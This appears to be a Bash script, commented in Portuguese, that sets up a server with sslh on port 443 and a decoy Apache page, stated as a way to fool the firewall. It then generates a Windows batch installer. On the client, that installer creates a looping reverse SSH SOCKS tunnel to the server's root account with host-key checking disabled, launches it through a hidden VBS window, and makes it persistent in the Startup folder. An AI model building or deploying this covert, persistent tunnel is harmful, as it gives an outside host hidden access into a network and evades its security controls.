#!/bin/bash

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

clear
echo -e "${BLUE}======================================================${NC}"
echo -e "${BLUE}    GERADOR DE TUNNEL REVERSO (SSLH + NOVO CLIENT)    ${NC}"
echo -e "${BLUE}======================================================${NC}"
echo ""

# 1. VERIFICACAO DE ROOT
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[ERRO] Este script precisa rodar como ROOT.${NC}"
   exit 1
fi

# 2. DETECCAO DE IP (IPv4)
echo -e "${YELLOW}[*] Detectando IP Publico (IPv4)...${NC}"
PUBLIC_IP=$(curl -s -4 ifconfig.me || curl -s -4 icanhazip.com)

if [[ -z "$PUBLIC_IP" ]]; then
    echo -e "${RED}[ERRO] Nao foi possivel detectar o IPv4. Verifique sua conexao.${NC}"
    exit 1
fi
echo -e "${GREEN}    -> IP Encontrado: $PUBLIC_IP${NC}"
echo ""

# 3. PERGUNTAS DE CONFIGURACAO
echo -e "${YELLOW}[?] Qual porta EXTERNA voce quer usar para enganar o firewall?${NC}"
read -p "    Digite a porta [443]: " PORT_EXTERNA
PORT_EXTERNA=${PORT_EXTERNA:-443}

echo ""
echo -e "${YELLOW}[?] Qual porta o SSH do servidor vai escutar localmente?${NC}"
read -p "    Digite a porta [22]: " PORT_SSH
PORT_SSH=${PORT_SSH:-22}

PORT_HTTP=8080

# 4. INSTALACAO DE PACOTES
echo -e "${YELLOW}[*] Atualizando e instalando dependencias...${NC}"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y -qq sslh apache2 openssh-server

# 5. CONFIGURACAO DO DISFARCE (APACHE)
echo "Listen 127.0.0.1:$PORT_HTTP" > /etc/apache2/ports.conf
echo "<html><body><h1>Service Unavailable</h1></body></html>" > /var/www/html/index.html
systemctl restart apache2

# 6. CONFIGURACAO DO SSLH
cat > /etc/default/sslh <<EOF
RUN=yes
DAEMON=/usr/sbin/sslh
DAEMON_OPTS="--user sslh --listen 0.0.0.0:$PORT_EXTERNA --ssh 127.0.0.1:$PORT_SSH --http 127.0.0.1:$PORT_HTTP --pidfile /var/run/sslh/sslh.pid"
EOF
systemctl restart sslh

# 7. GATEWAY PORTS
if ! grep -q "GatewayPorts yes" /etc/ssh/sshd_config; then
    echo "GatewayPorts yes" >> /etc/ssh/sshd_config
    systemctl restart ssh
fi

# 8. GERAÇÃO DO NOVO SCRIPT CLIENTE (CONFORME SOLICITADO)
CLIENT_FILE="instalar_tunnel.bat"

cat <<EOF > $CLIENT_FILE
@echo off
title INSTALADOR TUNNEL SSH - STARTUP
setlocal enabledelayedexpansion

:: --- CONFIGURAÇÕES DO SERVIDOR (GERADAS PELO SCRIPT) ---
set SERVER_IP=$PUBLIC_IP
set PORT=$PORT_EXTERNA
set USER_SSH=root
:: Pasta onde o script real vai morar
set "FOLDER=%APPDATA%\SSHTunnel"
:: Caminho da pasta Inicializar (Startup) do Windows
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
:: -------------------------------------

echo [+] Criando pasta de trabalho em %FOLDER%...
if not exist "%FOLDER%" mkdir "%FOLDER%"

echo [+] Gerando script de conexao (tunnel.bat)...
(
echo @echo off
echo :LOOP
echo echo [%date% %time%] Iniciando conexao...
echo ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -p %PORT% -N -R 1080 %USER_SSH%@%SERVER_IP%
echo echo [%date% %time%] Conexao caiu. Reiniciando em 10 segundos...
echo timeout /t 10 ^>nul
echo goto LOOP
) > "%FOLDER%\tunnel.bat"

echo [+] Gerando inicializador invisivel (start_tunnel.vbs)...
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "cmd.exe /c ""%FOLDER%\tunnel.bat""", 0, False
) > "%FOLDER%\start_tunnel.vbs"

echo [+] Configurando persistencia na pasta Inicializar...
copy /y "%FOLDER%\start_tunnel.vbs" "%STARTUP_FOLDER%\start_tunnel.vbs" >nul

echo.
echo ---------------------------------------------------
echo [+] INSTALACAO CONCLUIDA!
echo ---------------------------------------------------
echo [!] O tunnel agora inicia sozinho com o Windows.
echo [!] Local: %STARTUP_FOLDER%
echo.
echo Deseja iniciar a conexao agora em segundo plano? (S/N)
set /p opt=
if /i "%opt%"=="S" (
    start wscript.exe "%STARTUP_FOLDER%\start_tunnel.vbs"
    echo [+] Executando...
)

timeout /t 3
exit
EOF

# 9. RELATORIO FINAL
echo -e "${GREEN}======================================================${NC}"
echo -e " SERVIDOR PRONTO! Porta: $PORT_EXTERNA | IP: $PUBLIC_IP"
echo -e "======================================================${NC}"
echo -e "${YELLOW}>>> NOVO SCRIPT GERADO: $CLIENT_FILE${NC}\n"
cat $CLIENT_FILE
